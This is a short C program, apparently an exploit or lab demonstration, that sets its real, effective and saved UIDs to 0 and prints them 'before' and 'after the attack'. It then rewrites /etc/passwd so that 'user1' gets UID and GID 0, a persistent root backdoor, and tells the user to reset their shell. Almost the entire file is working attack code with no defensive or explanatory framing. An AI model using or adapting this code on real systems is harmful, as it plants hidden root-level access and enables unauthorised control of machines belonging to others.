#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

#include <stdlib.h>
#include <string.h>

void modify_passwd_file() {
    FILE *old_passwd = fopen("/etc/passwd", "r");
    FILE *new_passwd = fopen("/etc/passwd.tmp", "w");

    if (old_passwd == NULL || new_passwd == NULL) {
        perror("Error opening file");
        exit(1);
    }

    char line[256];
    // Change the UID of user1 from 1000 to 0 (root)
    while (fgets(line, sizeof(line), old_passwd)) {
        if (strcmp(line, "user1:x:1000:1000:Linux User,,,:/home/user1:/bin/sh\n") == 0) {
            fprintf(new_passwd, "user1:x:0:0:Linux User,,,:/home/user1:/bin/sh\n");
        } else {
            fprintf(new_passwd, "%s", line);
        }
    }

    fclose(old_passwd);
    fclose(new_passwd);

    // Replace the old passwd file with the new one
    if (rename("/etc/passwd.tmp", "/etc/passwd") != 0) {
        perror("Error renaming file");
        exit(1);
    }
}

int main() {

    uid_t ruid, euid, suid;

    // Get the real, effective, and saved user IDs
    if (getresuid(&ruid, &euid, &suid) == -1) {
        perror("getresuid");
        return 1;
    }

    // Display the user IDs Before the Attack
    printf("Real      UID: %d\n", ruid);
    printf("Effective UID: %d\n", euid);
    printf("Saved     UID: %d\n", suid);

    printf("--\n");
    // Elevate the privileges
    setresuid(0, 0, 0);

    if (getresuid(&ruid, &euid, &suid) == -1) {
        perror("getresuid");
        return 1;
    }

    // Display the user IDs After the Attack (Should be all 0)
    printf("Real      UID: %d\n", ruid);
    printf("Effective UID: %d\n", euid);
    printf("Saved     UID: %d\n", suid);

    // Modify the /etc/passwd file to give user1 root privileges
    modify_passwd_file();    

    printf("\nUser1 now has root privileges\n"
           "Reset your SHELL to update privileges\n");

    return 0;
}
